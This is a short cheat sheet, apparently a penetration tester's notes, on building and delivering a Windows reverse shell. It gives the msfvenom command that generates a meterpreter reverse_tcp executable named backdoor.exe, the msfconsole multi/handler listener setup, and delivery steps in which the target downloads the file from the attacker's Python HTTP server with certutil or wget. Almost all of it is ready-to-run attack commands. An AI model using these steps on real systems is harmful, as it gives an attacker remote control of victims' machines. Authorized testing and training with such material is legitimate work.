## Windows Reverse Shell exe
- Create the payload
	```
	# msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f exe > backdoor.exe
	```
	- Other payloads
		```
		windows/x64/meterpreter/reverse_tcp
		```
- Start a listener on #tools/multi/msfconsole 
	```
	> use multi/handler
	> set payload windows/meterpreter/reverse_tcp
	> set LHOST/LPORT
	```
- Execution options
	- Transfer and run through msfconsole
	- Download on the target machine if you have access to it
		- Host:
			```
			python3 -m http.server 80
			```
		- Target:
		```
		> certutil -urlcache -f http://<your_ip>/<file_name> <file_name>
		> OR
		> wget http://<you_IP>
		```